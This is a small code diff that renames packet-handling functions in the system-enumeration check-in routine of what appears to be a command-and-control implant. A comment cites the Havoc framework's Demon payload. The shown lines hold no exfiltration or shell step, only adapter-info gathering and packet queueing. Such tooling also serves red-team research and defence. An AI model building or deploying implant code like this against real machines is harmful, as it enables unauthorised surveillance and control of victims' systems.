@@ -95,7 +95,7 @@ namespace Main {
     BOOL EnumSystem() {
         // resolve version : https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/Demon.c#L368
 		BOOL success = false;
-        PACKET *outPack = CreateStreamWithHeaders(TypeCheckin);
+        PACKET *outPack = CreatePacketWithHeaders(TypeCheckin);
 
         IP_ADAPTER_INFO adapter = { };
         CHAR buffer[MAX_PATH] 	= { };
@@ -165,7 +165,7 @@ namespace Main {
 defer:
         success 
 			? MessageQueue(outPack) 
-			: DestroyStream(outPack);
+			: DestroyPacket(outPack);
 
         return success;
     }
